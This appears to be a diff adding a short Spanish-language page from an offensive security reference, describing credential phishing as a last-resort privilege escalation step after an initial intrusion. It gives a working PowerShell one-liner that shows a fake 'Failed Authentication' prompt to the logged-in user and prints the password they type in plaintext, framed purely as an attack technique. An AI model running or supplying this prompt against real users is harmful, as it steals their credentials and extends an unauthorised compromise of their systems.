@@ -1,0 +1,20 @@
+<h1>Phising</h1>
+
+<p>
+    Como último recurso, cuando toda opción de escalada de privilegios haya sido descartada, es posible realizar ataques 
+    de phising al usuario para que introduzca las credenciales de administrador haciéndose pasar por una petición legítima. 
+    Esta técnica puede levantar muchas sospechas por el comportamiento anómalo y puede poner en peligro la intrusión inicial.
+</p>
+
+<h3>◍ Ataque</h3>
+<p class="mainText">
+    El siguiente código abrirá al usuario un cuadro para introducir sus credenciales haciéndose pasar por una aplicación legítima.
+</p>
+<!-- Code snipet-->
+<div class="snipet_custom position-relative">
+<pre class="code_snipet code_powershell"><code data-language="shell">$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
+#Para recoger las credenciales
+$cred.GetNetworkCredential() | fl  
+</code></pre>
+</div>
+<!-- Code-->
